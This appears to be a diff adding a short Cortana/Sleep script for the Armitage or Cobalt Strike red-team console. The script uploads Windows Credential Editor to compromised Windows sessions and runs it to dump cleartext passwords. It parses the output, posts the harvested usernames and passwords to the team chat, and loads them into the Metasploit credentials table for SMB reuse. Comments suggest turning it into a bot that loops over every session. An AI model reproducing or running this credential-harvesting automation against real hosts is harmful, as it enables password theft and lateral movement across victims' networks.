@@ -1,0 +1,56 @@
+#
+# A script to run Windows Credential Editor against a session...
+#
+# Use:
+# View -> Scripts
+# wce [session id]
+# 
+# I leave it as an exercise to write your own bot.
+#
+# Requires wce.exe from:
+# http://www.ampliasecurity.com/research/wcefaq.html
+#
+
+global('$wce');
+
+on exec {
+	local('$temp $user $pass');
+	foreach $temp (split("\n", ["$3" trim])) {
+		if ("Options:*" iswm $temp) {
+			#return;
+		}
+		if ("Error:*" iswm $temp) {
+			#return;
+		}
+		if ("<contains-non-printable-chars>" isin $temp) {
+
+		}
+		else if ("*:*" iswm $temp) {
+			# print to the console
+			println("WCE: " . session_host($1) . "/ $+ $1 $temp");
+
+			# announce the results to the chat room
+			say("WCE: " . session_host($1) . "/ $+ $1 $temp");
+			
+			# add to the creds table, filter entries with spaces
+			($user, $pass) = split(':', $temp);
+			$user = split('\\\\', $user)[0];
+			if (" " !isin $user) {
+				cmd_async("creds -a " . session_host($1) . " -p 445 -u $user -P $pass");
+			}
+		}
+	}
+}
+
+command wce {
+	# $1 = first parameter to this command in the script console
+	run_wce($1);
+}
+
+# to make this into a bot, loop over your sessions, and call run_wce("session id")
+sub run_wce {
+	m_exec_local($1, $wce, "-w");
+}
+
+# upload $wce to team server... we may need it?
+$wce = file_put(script_resource("wce.exe"));
